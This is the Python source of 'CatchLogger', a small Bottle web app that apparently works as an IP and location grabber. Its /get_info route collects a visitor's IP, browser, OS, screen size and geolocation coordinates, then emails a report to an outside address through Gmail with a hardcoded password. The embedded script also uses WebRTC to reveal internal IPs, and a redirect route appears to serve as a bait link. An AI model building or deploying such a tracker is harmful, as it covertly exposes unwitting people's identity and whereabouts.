import os
import sqlite3
import smtplib
import json
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from bottle import *
from socket import gethostname, gethostbyname 

def page_file(root, filename):
    return static_file(filename, root=root)

def html(filename):
	filename += ".html"
	return static_file(filename, root="./html/")

def send_email(text): 
    fromaddr = "noreply.intschool@gmail.com"
    toaddr = "andtun@yandex.ru"
    msg = MIMEMultipart('alternative')
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "CatchLogger results"
     
    body = text
    msg.attach(MIMEText(body, 'html'))
     
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "adminpsw")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()


@get("/")
def man():
    return html("index")

@get("/browser.js")
def rtrn():
    return static_file('browser.js', root='./js/')

@get("/get_info")
def obr():
    ip = (request.environ.get('HTTP_X_FORWARDED_FOR') or request.environ.get('REMOTE_ADDR'))
    print(ip)
    d = {}
    info = list("browser, language, OS, navbrser, navos, h, w, location_info".split(", "))
    for i in info:
         d[i] = request.query[i]
         print("i: "+i+"  --  "+d[i])
    coords = list(d['location_info'].split("|"))
    try:
    	d['lat'] = coords[0]
    	d['long'] = coords[1]
    	d['rad'] = coords[2]
    except TypeError:
    	d['lat'] = 'undefined'
    	d['long'] = 'undefined'
    	d['rad'] = "Okay"
    
    text = """<!DOCTYPE html>
<html><head><style>html{overflow-y:scroll}body{width:910px;margin:20px auto 10px;padding:0 10px;font:13px/1.231 sans-serif;background:#EEE;color:#444;line-height:1.4em;font-size:1em}h2{border-bottom:1px solid #ccc;font-size:1.2em;font-weight:700;margin:7px 0 15px}h3{margin:16px 0 10px 0}div#c{background:#FFF;border:1px solid #ccc;-moz-border-radius:0 0 8px 8px;border-radius:0 0 8px 8px;width:830px;border-width:1px;padding:8px 40px}.b{font-weight:700}.h{height:59px;width:812px;background-color:#828282;-moz-border-radius:8px 8px 0 0;border-radius:8px 8px 0 0;text-align:center;position:relative;padding:0 50px}.h h1{color:#f2f2f2;font-size:1.5em;line-height:1.1em;margin-top:1px;padding:4px}.h h1 a{color:#EEE;outline:0;text-decoration:none}.h h1 a:hover{color:#e6e6e6}.f{color:#999;padding-top:9px;font-size:.8em;text-align:center;width:900px;margin-left:auto;margin-right:auto}.f a{cursor:pointer}a{color:#797979;outline:0;text-decoration:none}a:hover{text-decoration:underline}td,th{vertical-align:middle;line-height:23px}th{text-align:right;font-weight:400;color:#777;white-space:nowrap;width:135px}td{padding:0 2px 0 5px;font-weight:700;font-size:16px;color:#737373}#b{width:205px;top:-2px;height:27px;font-size:14px;font-weight:700;margin-left:17px;float:left;margin-top:2px}#r{background-repeat:no-repeat;background-position:right top;width:830px}#r span{background:#fff;background:rgba(255,255,255,.7)}input:hover{-moz-box-shadow:0 0 3px #999;-webkit-box-shadow:0 0 3px #999;box-shadow:0 0 3px #999;border-color:#7d7d7d;background-color:#f5f5f5}input{-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-moz-background-clip:padding;-webkit-background-clip:padding-box;border:1px solid #aaa;white-space:nowrap;position:relative;color:#444;text-decoration:none;font-size:12px;margin-left:8px;width:98%;height:23px;line-height:23px;padding-left:5px;-webkit-transition:background-color .5s;-moz-transition:background-color .5s;-o-transition:background-color .5s;transition:background-color .5s;vertical-align:bottom;background:#fff}input::-moz-focus-inner{border:0;padding:0}fieldset{margin:0 2px 15px 2px;padding:2px 8px 8px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-moz-background-clip:padding;-webkit-background-clip:padding-box;border:1px solid #aaa;background:#fbfbfb}fieldset div{height:29px;width:578px;float:left}legend label{font-size:16px;line-height:normal;border:0 none;padding:0}.mobile{background:transparent url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAAQCAYAAADAvYV+AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAGtJREFUeNpi/P//P0Nubu5mBgJg8uTJvow5OTkgha1AfAKPWgsgrmaBckAK8ZnuCyKYGEgAo4qRAQt6WBJtMisr62ZsNIbJwLhHNh2dBqUfVJOLioo2Y6NhAJaQwKZATccAsFTJSEoSBQgwAKTWJmjZzTsEAAAAAElFTkSuQmCC) no-repeat center left;padding-left:16px}.proxy{background:transparent url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEwAACxMBAJqcGAAAAPVJREFUOI210L0uRFEUBeBvhoJCRsYkSolaMxKi0Ei8g0Yk5g1oNBJaQkMIk6lVnkAUEo2CzhtI/CSIyrSK2ZKT67rmFlayk33WWWvtczb/iElcR038JqoUBFzhIjQLWCwzfRm3qEbdYalfcw2PmE24OTxgpJ+AA7Sjb2E1+g72/zI38YKxOG9HQSPuplJDNekrOMYm3nLCX7EVmtyAVoR0Cl7YxjBWshd1PGM6w6c7+MaM3pJrKXmCo4LJWZziME18wmiOcA87OXxdb6HNAZxjFzc5wkaE32f4Lj6wUcEn5vFe4gswjstBrOMMQyUDulgr6fmJL8y4KWxQQ0kTAAAAAElFTkSuQmCC) no-repeat center left;padding-left:20px}</style></head><body><div class="h"><h1><a href="http://ip-api.com/#">CatchLogger<br><span id="t">Почувствуй себя хуцкером</span></a></h1></div><div id="c"><h2 id="e">Log result</h2><div id="r" style="opacity: 1; background-image: url(&quot;http://maps.googleapis.com/maps/api/staticmap?key=AIzaSyAjh0Pdk6dasNa6f58zkd86cOrtNxbHQHE&amp;center=54.9008,38.0708&amp;zoom=7&amp;format=jpg&amp;size=320x349&amp;language=en&amp;path=color:0x3af1ad30|weight:116|54.9008,38.0708|54.9008,38.07081&quot;);"><table><tbody id="o"><tr><th>Browser:</th><td><span id="qr"><a href="#">%s</a></span></td></tr><tr><th>Language:</th><td><span>%s</span></td></tr><tr><th>OS:</th><td><span>%s</span></td></tr><tr><th>Browser (navi):</th><td><span>%s</span></td></tr><tr><th>OS (navi):</th><td><span>%s</span></td></tr><tr><th>Window height:</th><td><span>%s</span></td></tr><tr><th>Window width:</th><td><span>%s</span></td></tr><tr><th>Latitude:</th><td><span>%s</span></td></tr><tr><th>Longitude:</th><td><span>%s</span></td></tr><tr><th>Radius:</th><td><span>%s</span></td></tr><tr><th>IP:</th><td><span>%s</span></td></tr></tbody></table></div><div class="f"><div id="loDiv">© CatchLogger by Andrey A Tyunyatkin </div></div></div><script>function cn(){return prompt("You can contact us at:",unescape("636f6e746163744069702d6170692e636f6d".replace(/(..)/g,"%$1"))),!1}function a(e,n,o){e=p+"//"+e,this.gr=function(){return window.ActiveXObject?new ActiveXObject("Microsoft.XMLHTTP"):window.XMLHttpRequest?new XMLHttpRequest:!1};var t=gr();t.onreadystatechange=function(){4==t.readyState&&200==t.status&&n(j(t.responseText))},t.open("GET",e,!0),o&&t.setRequestHeader("Accept-Language","force;"+cl),t.send()}function j(e){try{return JSON.parse(e)}catch(n){return!1}}function eh(e){return e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/"/g,"&quot;")}function x(e){return document.getElementById(e)}function ne(e){return document.createElement(e)}function o(e,n){try{x(e).innerHTML=n}catch(o){"o"==e&&ix(x(e),n)}}function z(e,n,t){var i=x("o");if(i){if(t&&x(t))return o(t,n);var a=ne("tr"),r=ne("th"),c=ne("td"),l=ne("span");t&&(l.id=t),r.appendChild(document.createTextNode(e+":")),l.innerHTML=n,c.appendChild(l),a.appendChild(r),a.appendChild(c),i.appendChild(a)}}function ma(e,n,o){return"<a "+(n?"class='mobile' title='mobile connection'":o?"class='proxy' title='proxy'":"")+" href='#"+e+"'>"+e+"</a>"}function ix(e,n){var o=i8;o.innerHTML="<table><tbody id='o'><th>"+n+"</th></tbody></table>",e.parentNode.replaceChild(o.firstChild.firstChild,e)}function nf(){}function cz(e){for(var n=10,o=2;320*n>e;)n/=2,o++;return Math.min(16,o)}function ms(e,n,o){zl=cz(o),x("r").style.backgroundImage="url('"+p+"//maps.googleapis.com/maps/api/staticmap?key=AIzaSyAjh0Pdk6dasNa6f58zkd86cOrtNxbHQHE&center="+e+","+n+"&zoom="+zl+"&format=jpg&size=320x349&language="+cl+"&path=color:0x3af1ad30|weight:"+Math.max(15,parseInt(o*(1190/Math.pow(2,17-zl))))+"|"+e+","+n+"|"+e+","+(n+1e-5)+"')",mo(1)}function mu(){x("r").style.backgroundImage="",mo(1)}function mo(e){x("r").style.opacity=e}function gi(){var e={},n=window.RTCPeerConnection||window.mozRTCPeerConnection||window.webkitRTCPeerConnection,o={optional:[{RtpDataChannels:!0}]},t={iceServers:[{url:"stun:"+ep,urls:"stun:"+ep}]};if(!n){var i=document.createElement("iframe");i.style.display="none",i.sandbox="allow-same-origin allow-scripts",document.body.appendChild(i);var a=i.contentDocument.createElement("iframe");a.sandbox="allow-same-origin",a.addEventListener("DOMNodeInserted",function(e){e.stopPropagation()},!1),a.addEventListener("DOMNodeInsertedIntoDocument",function(e){e.stopPropagation()},!1),i.contentDocument.body.appendChild(a);var r=a.contentWindow;n=r.RTCPeerConnection||r.mozRTCPeerConnection||r.webkitRTCPeerConnection}try{var c=new n(t,o)}catch(d){try{c=new n({iceServers:[]})}catch(d){return}}c.onicecandidate=function(n){if(n.candidate){var n=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(n.candidate.candidate)[1],o=ma(n),t=n.split(".");void 0===e[o]&&(e[o]=!0,10==t[0]||172==t[0]&&t[1]>=16&&t[1]<=31||192==t[0]&&168==t[1]||0==t[0]||127==t[0]||100==t[0]&&t[1]>=64&&t[1]<=127||169==t[0]&&254==t[1]||192==t[0]&&0==t[1]&&2==t[2]||t[0]>=224&&t[0]<=255||198==t[0]&&(18==t[1]||19==t[1])?z(l[20],Object.keys(e).join(", "),"in"):mi!=n&&z(l[2],ma(mi)+", "+o,"qr"))}};try{c.createDataChannel("")}catch(s){}c.createOffer(function(e){c.setLocalDescription(e,nf,nf)},nf)}function gd(){for(var e="";32>e.length;e+=Math.random().toString(36).substr(2));a(e.substr(0,32)+".edns."+ep+"/json",function(e){e.dns&&z(l[15],ma(e.dns.ip)+" ("+e.dns.geo+")"),e.edns&&z(l[16],ma(e.edns.ip)+" ("+e.edns.geo+")")},1)}function fp(){a("fp."+ep+"/json",function(e){"success"==e.status&&(0!==e.link_mtu&&(tmp=[e.link_mtu+" MTU"]),""!==e.link_type?tmp.push(e.link_type):e.link_mtu%2==1&&tmp.push("OpenVPN?"),""!==e.os_name&&tmp.push(e.os_name+(""!==e.os_flavor?" ("+e.os_flavor+")":"")),""!==e.http_name&&tmp.push(e.http_name+(""!==e.http_flavor?" ("+e.http_flavor+")":"")),(1==e.bad_sw||2==e.bad_sw)&&tmp.push("fake user-agent"+(1==e.bad_sw?" (proxy?)":"")),z(l[27],tmp.join(", ")),""!==e.user_agent&&z(l[28],e.user_agent))})}function q(e){"undefined"==typeof e&&(e=location.hash.substring(1)),e=decodeURIComponent(e).trim(),(iu=e.match(/^https?\:\/\/([^\/:?#]+)(?:[\/:?#]|$)/i))&&(e=iu[1]),mo(.6),cq=location.hash=document.forms[0].ip.value=e,o("e",l[18]),a(ep+"/json/"+e+"?fields=520191",function(n){o("o",""),"success"==n.status?(ms(n.lat,n.lon,n.accuracy),z(l[2],ma(n.query,n.mobile,n.proxy),"qr"),z(l[3],n.country),z(l[4],n.countryCode),z(l[5],n.regionName),z(l[6],n.region),z(l[7],n.city),z(l[8],n.zip),z(l[9],n.lat),z(l[10],n.lon),z(l[11],n.timezone),z(l[12],n.isp),z(l[13],n.org),z(l[14],n.as),""==e?(document.forms[0].ip.value=mi=n.query,o("e",l[19]),gd(),fp(),gi()):o("e",l[17])):(mu(),o("e",l[17]),"fail"==n.status?o("o",l[0]+eh(n.query)+" ("+eh(n.message)+")"):o("o",l[1]))},1)}function sl(e){window.localStorage.l=e}function gl(){return window.localStorage.l||dl}function k(e){e?sl(e):e=gl(),e in lo||(e=dl,sl(dl)),cl="es"==e.substr(0,2)?"es":e,l=lo[e],q(),i=[];for(var n in lo)i.push('<a class="'+(n==e?"b":'" onclick="k(\''+n+"')")+'">'+lo[n][26]+"</a>");o("loDiv",i.join(" - ")),o("l",l[22]),o("t",l[23]),o("d",l[24]),x("b").value=l[25],document.title=l[21]}var lo={en:["Unable to retrieve geolocation information for ","Unknown error","IP","Country","Country code","Region","Region code","City","Zip Code","Latitude","Longitude","Timezone","ISP","Organization","AS number/name","DNS server","edns-client-subnet","Query result","Loading...","Your current IP Address","Internal IP","IP-API.com - Free Geolocation API","Query IP/domain","Geolocation API","API documentation","Submit","English","TCP/IP fingerprint","User-Agent"],ro:["Nu am putut prelua geolocația pentru ","Eroare necunoscută","IP","Țară","Prefixul țării","Regiune","Cod regiune","Oraș","Cod poștal","Latitudine","Longitudine","Fus orar","ISP","Organizație","Număr/nume AS","Server DNS","edns-client-subnet","Rezultatul interogării","Se încarcă...","Adresa dvs. de IP","IP intern","IP-API.com - API Geolocație gratuit","Interogare IP/domeniu","API Geolocație","Documentație API","Trimite","Română","Amprentă TCP/IP","Agent Browser"],ru:["Не удалось получить информацию геолокации для ","Неизвестная ошибка","IP","Страна","Код страны","Область","Код региона","Город","Почтовый Индекс","Широта","Долгота","Временная","Провайдер","Организация","AS номера/имени","DNS-сервер","edns-client-subnet","Результат запроса","Подождите, идет загрузка...","Ваше текущее IP-адрес","Внутренний IP","IP-API.com - Бесплатная API геолокации","Запрос IP/домен","API геолокации","API документация","Представлять","Русский","TCP/IP fingerprint","User-Agent"],fr:["Impossible de récupérer les informations de géolocalisation pour ","Erreur inconnue","IP","Pays","Code pays","Région","Le code de région","Ville","Code postal","Latitude","Longitude","Fuseau horaire","FAI","Organisation","AS numéro/nom","Serveur DNS","edns-client-subnet","Résultat de la requête","Chargement...","Votre adresse IP actuelle","IP interne","IP-API.com - API de géolocalisation gratuit","Interroger IP/domaine","API de géolocalisation","Documentation de l'API","Soumettre","Français","Empreintes digitales TCP/IP","Agent utilisateur"],de:["Kann Geolocation-Informationen abrufen ","Unbekannter Fehler","IP","Land","Landesvorwahl","Region","Regionalcode","City","Plz","Breite","Länge","Zeitzone","Provider","Organisation","AS Nummer/Name","DNS Server","edns-client-subnet","Abfrageergebnis","Wird geladen...","Ihre aktuelle IP-Adresse","Interne IP","IP-API.com - Kostenlose Geolocation API","Abfrage IP/Domain","Geolocation API","API-Dokumentation","Einreichen","Deutsch","TCP/IP-Fingerabdruck","User-Agent"],"es-ES":["No se puede recuperar la información de geolocalización de ","Error desconocido","IP","País","Código del país","Región","Código de región","Ciudad","Código postal","Latitud","Longitud","Zona horaria","Proveedor","Organización","Número/Nombre de AS","Servidor DNS","edns-client-subnet","Resultado de la consulta","Cargando...","Su dirección IP actual","IP interna","IP-API.com - API de geolocalización gratuito","Consulta IP/dominio","API de geolocalización","Documentación de la API","Presentar","Español","Huella digital TCP/IP","Agente de usuario"],"es-AR":["No se pudo obtener la información de geolocalización de ","Error desconocido","Dirección IP","País","Código de país","Región","Código de región","Ciudad","Código postal","Latitud","Longitud","Huso horario","Proveedor de Internet","Organización","Número y nombre de AS","Servidor DNS","edns-client-subnet","Resultado de la consulta","Cargando…","Tu dirección IP actual","Dirección IP interna","IP-API.com - API gratis de geolocalización","Consultar dirección IP / dominio","API de geolocalización","Documentación de API","Enviar","Español (Argentina)","Huella digital TCP/IP","Agente de usuario"],"zh-CN":["无法检索地理位置信息 ","未知错误","IP","国家","国家代码","区域","区域代码","城市","邮政编码","纬度","经度","时区","ISP","组织","AS号码/名称","DNS服务器","edns-client-subnet","查询结果","加载中...","您当前的IP地址","内部IP","IP-API.com - 免费地理位置API","查询IP/域名： ","地理定位API","API文档","提交","中国","TCP/IP指纹","用户代理"],ja:["のためのジオロケーション情報を取得できません","不明なエラー","IP","カントリー","国コード","地域","リージョンコード","シティ","郵便番号","緯度","経度","タイムゾーン","ISP","組織","番号/名前AS","DNSサーバ","edns-client-subnet","クエリ結果","読み込んでいます...","あなたの現在のIPアドレス","内部IP","IP-API.com - フリージオロケーションAPI","クエリIP /ドメイン： ","ジオロケーションAPI","APIドキュメント","提出する","日本語","TCP/IP指紋","ユーザーエージェント"]},dl="en",cl,cq,l,mi,i8=ne("div"),ep="ip-api.com",p="http:";k(),window.onhashchange=function(){location.hash.substring(1)!==cq&&q()};</script></body></html>""" % (d['browser'], d['language'], d['OS'], d['navbrser'], d['navos'], d['h'], d['w'], d['lat'], d['long'], d['rad'], ip)
    send_email(text)
    

@get("/login")
def login():
	return html("login")

@get("/spasibi")
def faq():
    return html("spasibi")

# test logger
@get("/catch")
def chk():
    return html("catch")
#---------------

@get("/link/<whereto>")
def redir(whereto):
    whereto = "http://"+whereto
    ip = gethostbyname(gethostname())
    redirect(whereto)
    
        
# =========================FOR BEAUTY==========================

@route("/<root>/<filename>")
def f(root, filename):
    return page_file(root, filename)

@route("/css/font-awesome/css/font-awesome.min.css")
def font():
    return static_file("font-awesome.min.css", root="./css/font-awesome/css/")

@route("/images/logo.png")
def logo():
    return static_file("Logo.png", root='./images/')

@error(404)
def fff(error):
    return html("404")

@error(500)
def fff(error):
    return html("500")
# -------------------------------------------------------------
    
run(host="0.0.0.0", port=os.environ.get('PORT', 5000), debug=True)
